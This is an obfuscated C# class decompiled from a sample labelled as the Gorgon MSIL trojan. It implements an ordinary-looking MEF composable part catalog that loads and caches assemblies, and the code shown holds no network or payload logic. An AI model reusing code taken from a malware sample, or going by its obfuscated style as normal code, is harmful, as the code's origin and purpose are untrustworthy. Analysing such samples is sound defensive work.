// Decompiled with JetBrains decompiler
// Type: 0foHdXo.zINRWpL
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0030foHdXo;
using \u0032DVyudQ;
using \u0032TZs6tE;
using \u0034zrRrwu;
using \u0035kbAcwV;
using \u00366N2IhJ;
using \u0037h0JAji;
using Di3tgNX;
using jWEwPnv;
using jz0haJe;
using li9OdoS;
using R4qHaNR;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using U8zsCil;
using vn312U5;
using ZuqPiTm;

namespace \u0030foHdXo
{
  internal class zINRWpL : ComposablePartCatalog, ICachedComposablePartCatalog
  {
    private AggregateCatalog MUKFtkV;
    private zINRWpL Q4vN9I7;
    private IDictionary<string, \u00319427NS> qMz10Tm;
    private ISet<string> rMiAX4e;
    private volatile bool mXwKbY1;
    private BeWDuY7 WxmJOT8;
    private IDictionary<string, int> m08vjz4;
    private bool aUEK5D7;
    private ICollection<YkBa6Sd> l7pWaf4;
    private IDictionary<string, YkBa6Sd> icy7gs5;
    private object XCP9if7 = new object();
    private jUU2Be4 othmjL2;
    private bool D5iVhYa;
    private IDictionary<ComposablePartDefinition, \u0036ag9UIM> \u0032W967lI;
    private Lazy<CompositionScopeDefinition> DOurIw1;
    private IDictionary<string, string> Es2inJc;
    private Dictionary<int, ICollection<ComposablePartCatalog>> LlIj7t6;
    private object vO2TBx0 = new object();
    private object JOQSfNx = new object();

    public zINRWpL(
      IEnumerable<string> catalogAssemblies,
      jUU2Be4 host,
      IEnumerable<string> allAssemblies)
    {
      this.icy7gs5 = cvsquDh.MVSm67N((IEnumerable<YkBa6Sd>) cvsquDh.vz3d4dk(host, allAssemblies.Except<string>(catalogAssemblies, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase)));
      this.l7pWaf4 = cvsquDh.vz3d4dk(host, catalogAssemblies);
      this.NxtmxhU(catalogAssemblies, host);
    }

    public zINRWpL(
      BeWDuY7 reader,
      IDictionary<string, int> cacheAssemblyCatalogTokens,
      IList<YkBa6Sd> catalogAssembliesData,
      IList<YkBa6Sd> notCatalogAssembliesData)
    {
      this.WxmJOT8 = reader != null ? reader : throw new ArgumentNullException(nameof (reader));
      this.m08vjz4 = cacheAssemblyCatalogTokens;
      this.l7pWaf4 = cvsquDh.n8SpUmj((IEnumerable<YkBa6Sd>) catalogAssembliesData);
      this.icy7gs5 = cvsquDh.MVSm67N((IEnumerable<YkBa6Sd>) notCatalogAssembliesData);
    }

    public virtual IQueryable<ComposablePartDefinition> Y6QbYbF
    {
      get
      {
        lock (this.XCP9if7)
        {
          this.\u0032tnSkYu();
          return this.MUKFtkV.Parts;
        }
      }
    }

    public bool zXFMmli
    {
      get
      {
        bool? xuQjNqj = this.WxmJOT8.XUQjNqj;
        bool flag = true;
        return !(xuQjNqj.GetValueOrDefault() == flag & xuQjNqj.HasValue);
      }
    }

    public bool hZ7CbWz
    {
      get
      {
        lock (this.XCP9if7)
        {
          this.\u0032tnSkYu();
          if (!this.aUEK5D7 || this.D5iVhYa || this.WxmJOT8 != null && this.WxmJOT8.\u0033UShIkd)
            return false;
          foreach (ICachedComposablePartCatalog composablePartCatalog in (IEnumerable<\u00319427NS>) this.qMz10Tm.Values)
          {
            if (!composablePartCatalog.IsCacheUpToDate)
              return false;
          }
          return true;
        }
      }
    }

    public IDictionary<string, string> ibRIFHl => this.Es2inJc;

    public IDictionary<ComposablePartDefinition, \u0036ag9UIM> k5jVZzy => this.\u0032W967lI;

    public CompositionScopeDefinition G1Hcxpy => this.DOurIw1.Value;

    public IDictionary<string, YkBa6Sd> z09Mq1a { get; private set; }

    public IEnumerable<string> J4biWWt
    {
      get
      {
        lock (this.XCP9if7)
          return (IEnumerable<string>) this.rMiAX4e;
      }
    }

    public ICollection<YkBa6Sd> ogiBu2C
    {
      get
      {
        lock (this.XCP9if7)
        {
          if (this.l7pWaf4 == null)
            this.l7pWaf4 = cvsquDh.n8SpUmj();
          return this.l7pWaf4;
        }
      }
    }

    public ICollection<YkBa6Sd> k5AhiAC
    {
      get
      {
        lock (this.XCP9if7)
        {
          if (this.icy7gs5 == null)
            this.icy7gs5 = cvsquDh.MVSm67N();
          return this.icy7gs5.Values;
        }
      }
    }

    public static string tJt8Rjn(string _param0) => new AssemblyName(_param0).Name;

    public void lXBVFOs(
      IEnumerable<string> _param1,
      jUU2Be4 PIMelkc,
      bool _param3,
      zINRWpL SVsf1Ra = null)
    {
      lock (this.XCP9if7)
      {
        if (this.WxmJOT8 == null)
          throw new InvalidOperationException(MykOU9k.xM7Ic6G);
        if (this.aUEK5D7)
          throw new InvalidOperationException(MykOU9k.fVa6dl2);
        this.Q4vN9I7 = SVsf1Ra;
        this.WxmJOT8.vmdAmlm(_param1);
        this.WxmJOT8.jgrYDxF();
        this.NxtmxhU(_param1, PIMelkc, SVsf1Ra);
        this.aUEK5D7 = true;
        this.D5iVhYa = _param3 || SVsf1Ra != null;
      }
    }

    public virtual IEnumerable<Tuple<ComposablePartDefinition, ExportDefinition>> tSFZMOJ(
      ImportDefinition uRdcwnB)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      zINRWpL.FWatnbY fwatnbY = (zINRWpL.FWatnbY) new \u0036HFRYLK.ZzeKUWT();
      // ISSUE: reference to a compiler-generated field
      ((\u0036HFRYLK.ZzeKUWT) fwatnbY).PhVv4Hc = uRdcwnB;
      lock (this.XCP9if7)
      {
        this.\u0032tnSkYu();
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated method
        return ((\u0036HFRYLK.ZzeKUWT) fwatnbY).PhVv4Hc != null ? (IEnumerable<Tuple<ComposablePartDefinition, ExportDefinition>>) this.F8vGGYa(((\u0036HFRYLK.ZzeKUWT) fwatnbY).PhVv4Hc).SelectMany<ComposablePartCatalog, Tuple<ComposablePartDefinition, ExportDefinition>>(new Func<ComposablePartCatalog, IEnumerable<Tuple<ComposablePartDefinition, ExportDefinition>>>(fwatnbY.kTAqfFS)).ToList<Tuple<ComposablePartDefinition, ExportDefinition>>() : throw new ArgumentNullException("definition");
      }
    }

    public bool f5rfZI0(string _param1) => this.rMiAX4e.Contains(_param1);

    public IEnumerable<string> RexmPIN(IEnumerable<string> sP7NxFH)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      zINRWpL.FWatnbY fwatnbY = new zINRWpL.FWatnbY(-2);
      // ISSUE: reference to a compiler-generated field
      ((zINRWpL.qKEqyJP) fwatnbY).ZAZgi5k = this;
      // ISSUE: reference to a compiler-generated field
      ((zINRWpL.qKEqyJP) fwatnbY).KlTU8of = sP7NxFH;
      return (IEnumerable<string>) fwatnbY;
    }

    public object zEapjLA(MyzKvwp kKm0uE4)
    {
      lock (this.XCP9if7)
      {
        this.\u0032tnSkYu();
        if (kKm0uE4 == null)
          throw new ArgumentNullException("writer");
        foreach (ICachedComposablePartCatalog composablePartCatalog in this.qMz10Tm.Select<KeyValuePair<string, \u00319427NS>, \u00319427NS>((Func<KeyValuePair<string, \u00319427NS>, \u00319427NS>) (jYzMumb => jYzMumb.Value)))
          composablePartCatalog.CacheCatalog(kKm0uE4);
        return (object) null;
      }
    }

    internal void gnY5egS()
    {
      try
      {
        if (this.mXwKbY1)
          return;
        lock (this.XCP9if7)
        {
          if (this.mXwKbY1)
            return;
          this.MUKFtkV.Dispose();
          this.MUKFtkV = (AggregateCatalog) null;
          if (this.WxmJOT8 != null)
          {
            this.WxmJOT8.OR9I5k2();
            this.WxmJOT8 = (BeWDuY7) null;
          }
          this.mXwKbY1 = true;
        }
      }
      finally
      {
        base.Dispose(true);
      }
    }

    internal \u00319427NS cmxxvRG(string mUSEsAN) => this.qMz10Tm[mUSEsAN];

    protected override void Dispose(bool disposing)
    {
    }

    private IEnumerable<ComposablePartCatalog> F8vGGYa(
      ImportDefinition OG0Btfn)
    {
      return OG0Btfn is ContractBasedImportDefinition ? MLRjbIR.GYRyjQi(OG0Btfn).SelectMany<string, ComposablePartCatalog>((Func<string, IEnumerable<ComposablePartCatalog>>) (Dw9mxiF => this.\u0038K3rcYD(Dw9mxiF))).Distinct<ComposablePartCatalog>() : (IEnumerable<ComposablePartCatalog>) this.qMz10Tm.Values;
    }

    private IEnumerable<ComposablePartCatalog> \u0038K3rcYD(
      string lliAAbF)
    {
      ICollection<ComposablePartCatalog> composablePartCatalogs;
      return this.LlIj7t6.TryGetValue(lliAAbF.GetHashCode(), out composablePartCatalogs) ? (IEnumerable<ComposablePartCatalog>) composablePartCatalogs : Enumerable.Empty<ComposablePartCatalog>();
    }

    private void NxtmxhU(IEnumerable<string> x1vQqjD, jUU2Be4 Y4pb0kN, zINRWpL _param3 = null)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      zINRWpL.\u0038Tg8UYX obj = (zINRWpL.\u0038Tg8UYX) new zINRWpL.F6Ydwbc();
      // ISSUE: reference to a compiler-generated field
      ((zINRWpL.F6Ydwbc) obj).PrMk8p7 = this;
      // ISSUE: reference to a compiler-generated field
      obj.DiGc3tH = _param3;
      if (x1vQqjD == null)
        throw new ArgumentNullException("assemblyPaths");
      if (Y4pb0kN == null)
        throw new ArgumentNullException("host");
      // ISSUE: reference to a compiler-generated method
      this.DOurIw1 = new Lazy<CompositionScopeDefinition>(new Func<CompositionScopeDefinition>(obj.SreLaPE), true);
      this.rMiAX4e = (ISet<string>) new HashSet<string>(x1vQqjD, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      this.othmjL2 = Y4pb0kN;
      if (this.WxmJOT8 != null)
      {
        this.z09Mq1a = this.WxmJOT8.hKG0fLC;
        if (this.Q4vN9I7 != null && this.Q4vN9I7.z09Mq1a != null)
        {
          foreach (KeyValuePair<string, YkBa6Sd> keyValuePair in (IEnumerable<KeyValuePair<string, YkBa6Sd>>) this.Q4vN9I7.z09Mq1a)
            this.z09Mq1a[keyValuePair.Key] = keyValuePair.Value;
        }
        this.\u0032W967lI = this.WxmJOT8.\u0035glwV99;
      }
      else
        this.\u0032W967lI = (IDictionary<ComposablePartDefinition, \u0036ag9UIM>) new Dictionary<ComposablePartDefinition, \u0036ag9UIM>();
      this.Es2inJc = (IDictionary<string, string>) new ConcurrentDictionary<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      this.LlIj7t6 = new Dictionary<int, ICollection<ComposablePartCatalog>>();
      this.qMz10Tm = (IDictionary<string, \u00319427NS>) new ConcurrentDictionary<string, \u00319427NS>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      // ISSUE: reference to a compiler-generated method
      Parallel.ForEach<string>((IEnumerable<string>) this.rMiAX4e, new Action<string>(obj.SYEHdTb));
      cvsquDh.CT4J72g<ComposablePartCatalog>((IDictionary<int, ICollection<ComposablePartCatalog>>) this.LlIj7t6);
      this.MUKFtkV = new AggregateCatalog((IEnumerable<ComposablePartCatalog>) this.qMz10Tm.Values);
    }

    private CompositionScopeDefinition n80rUGv()
    {
      if (this.WxmJOT8 != null && this.hZ7CbWz)
        return this.WxmJOT8.Mf5FE4G((ComposablePartCatalog) this);
      ComposablePartCatalog catalog = MLRjbIR.MVAHeFh((ComposablePartCatalog) this, this.othmjL2.d2Ww44u);
      ICompositionScopeCreator xQ9kqZA;
      return !this.othmjL2.W8lUGVq(out xQ9kqZA) ? new CompositionScopeDefinition(catalog, Enumerable.Empty<CompositionScopeDefinition>()) : xQ9kqZA.CreateScope(catalog);
    }

    private void Zi6I54z(string P7NDkay, zINRWpL SaTkEUr)
    {
      try
      {
        if (this.qMz10Tm.ContainsKey(P7NDkay))
          return;
        \u00319427NS HiwjBSa = (\u00319427NS) null;
        if ((SaTkEUr == null || !SaTkEUr.\u0032fHCB4W(P7NDkay, out HiwjBSa)) && !this.\u0032fHCB4W(P7NDkay, out HiwjBSa))
        {
          HiwjBSa = new \u00319427NS(P7NDkay, this.othmjL2, this.\u0032W967lI);
          List<ComposablePartDefinition> source = new List<ComposablePartDefinition>((IEnumerable<ComposablePartDefinition>) HiwjBSa.Parts);
          if (source.All<ComposablePartDefinition>((Func<ComposablePartDefinition, bool>) (q4lDBd2 =>
          {
            q4lDBd2.ImportDefinitions.All<ImportDefinition>((Func<ImportDefinition, bool>) (pebDyhu => true));
            q4lDBd2.ExportDefinitions.All<ExportDefinition>((Func<ExportDefinition, bool>) (VEDv4LJ => VEDv4LJ.Metadata.Count >= 0));
            return true;
          })) && this.othmjL2.pxBMSPO)
            Trace.WriteLine(string.Format((IFormatProvider) CultureInfo.CurrentCulture, "Loaded MEF assembly {0} with {1} part(s).", (object) P7NDkay, (object) source.Count));
        }
        if (!HiwjBSa.WN3EAsL)
        {
          lock (this.vO2TBx0)
            cvsquDh.j4BcFIK<ComposablePartCatalog>((IDictionary<int, ICollection<ComposablePartCatalog>>) this.LlIj7t6, HiwjBSa.\u0035fV3fk2, (ComposablePartCatalog) HiwjBSa);
          this.othmjL2.\u00340C4Zbq(\u0037jxjFzS.Information, "Successfully loaded component assembly" + (HiwjBSa.QtDh7PX ? " from cache" : string.Empty), P7NDkay);
        }
        if (!this.Es2inJc.ContainsKey(HiwjBSa.UzhoWsk))
        {
          this.Es2inJc.Add(HiwjBSa.\u00322KBrEi, HiwjBSa.UzhoWsk);
          this.Es2inJc.Add(HiwjBSa.UzhoWsk, HiwjBSa.\u00322KBrEi);
        }
        if (this.Q4vN9I7 != null && this.Q4vN9I7.WxmJOT8 != null)
        {
          IDictionary<string, string> ld4EzzM = this.Q4vN9I7.WxmJOT8.Ld4EZzM;
          if (!ld4EzzM.ContainsKey(HiwjBSa.UzhoWsk))
          {
            ld4EzzM.Add(HiwjBSa.\u00322KBrEi, HiwjBSa.UzhoWsk);
            ld4EzzM.Add(HiwjBSa.UzhoWsk, HiwjBSa.\u00322KBrEi);
          }
        }
        this.qMz10Tm.Add(P7NDkay, HiwjBSa);
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.othmjL2, ex, P7NDkay);
      }
    }

    private bool \u0032fHCB4W(string yRjkEYJ, out \u00319427NS HiwjBSa)
    {
      HiwjBSa = (\u00319427NS) null;
      if (this.WxmJOT8 == null)
        return false;
      int num;
      if (!this.m08vjz4.TryGetValue(yRjkEYJ, out num))
        return false;
      try
      {
        lock (this.JOQSfNx)
          HiwjBSa = (\u00319427NS) this.WxmJOT8.dA2UB8e((object) num);
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.othmjL2, ex, yRjkEYJ);
        return false;
      }
      return true;
    }

    private void \u0032tnSkYu()
    {
      if (this.mXwKbY1)
        throw new ObjectDisposedException(this.GetType().ToString());
    }
  }
}
